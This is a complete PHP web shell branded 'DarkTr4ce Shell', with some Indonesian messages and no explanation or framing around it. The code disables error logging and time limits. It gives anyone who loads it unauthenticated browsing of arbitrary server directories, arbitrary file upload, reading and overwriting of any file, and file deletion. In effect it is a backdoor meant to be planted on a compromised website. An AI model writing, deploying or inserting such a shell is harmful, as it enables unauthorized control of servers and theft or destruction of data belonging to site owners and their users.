
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@clearstatcache();

echo "<!DOCTYPE html><html><head><title>DarkTr4ce Shell</title><style>
body{background:#0f0f0f;color:#00ffe1;font-family:Courier;}
a{color:#0ff;text-decoration:none;}
table{width:100%;border-collapse:collapse}
th,td{padding:5px;border:1px solid #222;}
input[type=text],input[type=submit]{background:#222;border:1px solid #444;color:#0ff;}
</style></head><body>";

$path = getcwd();
if(isset($_GET['path'])){
    $path = $_GET['path'];
    chdir($path);
}
$files = scandir(".");
echo "<h1>DarkTr4ce Shell</h1><p>Directory: ".htmlspecialchars($path)."</p>";
echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach($files as $file){
    $size = @filesize($file);
    echo "<tr><td><a href='?path=".urlencode($path)."/".urlencode($file)."'>".htmlspecialchars($file)."</a></td><td>".$size."</td>";
    echo "<td><a href='?edit=".urlencode($file)."'>Edit</a> | <a href='?del=".urlencode($file)."'>Delete</a></td></tr>";
}
echo "</table><br><form enctype='multipart/form-data' method='POST'>
<input type='file' name='file'><input type='submit' name='upload' value='Upload'></form>";

if(isset($_POST['upload'])){
    $filename = $_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $filename)){
        echo "<p>Upload berhasil: $filename</p>";
    } else {
        echo "<p>Upload gagal.</p>";
    }
}

if(isset($_GET['edit'])){
    $f = $_GET['edit'];
    echo "<h3>Editing: $f</h3>";
    echo "<form method='POST'><textarea name='code' rows=20 cols=100>".htmlspecialchars(file_get_contents($f))."</textarea><br>
    <input type='submit' name='save' value='Save'></form>";
}

if(isset($_POST['save']) && isset($_GET['edit'])){
    file_put_contents($_GET['edit'], $_POST['code']);
    echo "<p>File saved.</p>";
}

if(isset($_GET['del'])){
    unlink($_GET['del']);
    echo "<p>File deleted.</p>";
}

echo "</body></html>";
?>
